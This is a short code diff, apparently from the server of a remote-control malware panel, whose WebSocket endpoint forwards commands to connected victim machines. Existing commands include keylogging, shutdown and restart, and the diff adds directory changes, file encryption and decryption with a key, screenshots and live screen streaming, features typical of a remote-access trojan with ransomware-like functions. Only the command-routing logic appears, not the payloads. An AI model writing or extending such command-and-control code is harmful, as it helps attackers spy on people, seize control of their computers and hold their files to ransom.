@@ -118,7 +118,14 @@ async def websocket_endpoint(websocket: WebSocket):
                 payload["limit"] = data.get("limit")
             elif action == "keylogger":
                 payload["count"] = data.get("count")
-            elif action in ("systeminfo", "shutdown", "restart"):
+            elif action == "cd":
+                payload["path"] = data.get("path")
+            elif action == "encrypt":
+                payload["path"] = data.get("path")
+            elif action == "decrypt":
+                payload["path"] = data.get("path")
+                payload["key_hex"] = data.get("key_hex")
+            elif action in ("systeminfo", "shutdown", "restart", "screenshot", "screenstream_start", "screenstream_stop"):
                 pass
             try:
                 await target_ws.send_json(payload)
